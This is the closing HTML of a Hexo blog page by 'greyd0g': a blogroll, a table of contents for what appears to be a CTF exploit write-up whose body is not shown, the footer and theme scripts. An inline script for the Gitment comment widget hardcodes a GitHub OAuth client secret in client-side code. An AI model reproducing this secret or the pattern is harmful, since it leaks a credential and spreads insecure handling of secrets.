+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.smallflower.xin/" title="小花' Blog" target="_blank">小花' Blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.get1t.cn/" title="FraMeQ's Blog" target="_blank">FraMeQ's Blog</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#题目描述"><span class="nav-number">1.</span> <span class="nav-text">题目描述</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#题目分析"><span class="nav-number">2.</span> <span class="nav-text">题目分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞利用"><span class="nav-number">3.</span> <span class="nav-text">漏洞利用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#最终exploit"><span class="nav-number">4.</span> <span class="nav-text">最终exploit</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考链接"><span class="nav-number">5.</span> <span class="nav-text">参考链接</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">greyd0g</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv">
+      <i class="fa fa-user"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+      
+    </span>
+  
+
+  
+    <span class="site-pv">
+      <i class="fa fa-eye"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+      
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+<!-- LOCAL: You can save these files to your site and update links -->
+    
+        
+        <link rel="stylesheet" href="https://aimingoo.github.io/gitmint/style/default.css">
+        <script src="https://aimingoo.github.io/gitmint/dist/gitmint.browser.js"></script>
+    
+<!-- END LOCAL -->
+
+    
+      <style>
+        a.gitment-editor-footer-tip { display: none; }
+        .gitment-container.gitment-footer-container { display: none; }
+      </style>
+    
+
+    
+      <script type="text/javascript">
+      function renderGitment(){
+        var gitment = new Gitmint({
+            id: window.location.pathname, 
+            owner: 'greyd0g',
+            repo: 'gitcomment',
+            
+            lang: "" || navigator.language || navigator.systemLanguage || navigator.userLanguage,
+            
+            oauth: {
+            
+            
+                client_secret: '49e64e3c97f36a8034c37a86dfa044a8be29208e',
+            
+                client_id: '1a762312d58b3f30d273'
+            }});
+        gitment.render('gitment-container');
+      }
+
+      
+      function showGitment(){
+        document.getElementById("gitment-display-button").style.display = "none";
+        document.getElementById("gitment-container").style.display = "block";
+        renderGitment();
+      }
+      
+      </script>
+    
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+
+  
+
+
+</body>
+</html>
